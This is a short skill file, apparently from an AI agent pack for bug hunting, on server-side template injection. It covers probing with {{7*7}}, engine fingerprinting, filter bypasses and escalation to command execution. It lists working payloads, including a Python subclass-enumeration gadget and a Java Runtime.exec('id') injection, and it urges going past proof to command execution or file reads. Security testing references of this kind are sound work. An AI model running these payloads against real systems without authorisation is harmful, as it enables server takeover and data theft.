---
skill: ssti
title: "SSTI"
category: "Security · Web Exploitation"
load_when: "User input rendered through a server template (emails/PDFs/pages/notifications)."
pack: SUPERAGENT V10
bughunt: true
---
# SSTI

## Where it pays
Frequently escalates to RCE.

## Attack-surface signals
User data in generated docs/emails/pages; name/notification templating.

## Methodology
1. Probe {{7*7}} ${7*7} #{7*7} <%=7*7%> → 49.
2. Fingerprint engine (differential payloads).
3. Escalate to code exec with engine gadgets.

## Payloads
```
{{7*7}}
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}
#{T(java.lang.Runtime).getRuntime().exec('id')}
```
More: `../payloads/ssti.txt`.

## Root causes
render_template_string(user_input) · string-built templates · unsafe features enabled.

## Bypasses
|attr() · hex/unicode · concatenation · sandbox escapes.

## Validation gate
Show arithmetic then a controlled command (id)/file read — don't stop at 49.

## Impact & chains
**RCE** → full server compromise; or file read / SSRF.

**→ next on hit: `../phases/04-chain.md`. Payloads in `../payloads/`.**
